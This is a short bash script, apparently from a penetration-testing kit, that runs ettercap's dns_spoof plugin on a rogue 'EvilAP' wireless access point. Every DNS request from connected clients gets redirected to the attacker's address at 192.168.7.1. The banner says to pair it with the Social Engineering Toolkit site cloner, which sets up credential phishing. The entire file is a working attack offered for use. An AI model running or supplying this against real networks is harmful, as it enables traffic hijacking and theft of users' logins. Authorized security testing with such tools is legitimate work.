#!/bin/bash
#
# Script to use ettercap to redirect all dns traffic back to the pwnpad
# use with Social Engineering Toolkit (site cloner)
#

f_banner(){
  clear
  echo
  echo "EvilAP Ettercap-NG 0.8.0 DNS Spoofing script"
  echo
  echo "Warning: Currently only works when evilap is running!"
  echo
  echo "Note: All DNS requests from wireless clients connect to EvilAP "
  echo "will be redirected to IP of EvilAP (192.168.7.1)"
  echo
  echo "Use with Social Engineering Toolkit (site cloner use 192.168.7.1)"
}

f_run(){
  f_banner
  ettercap -i at0 -T -q -P dns_spoof
}

f_run
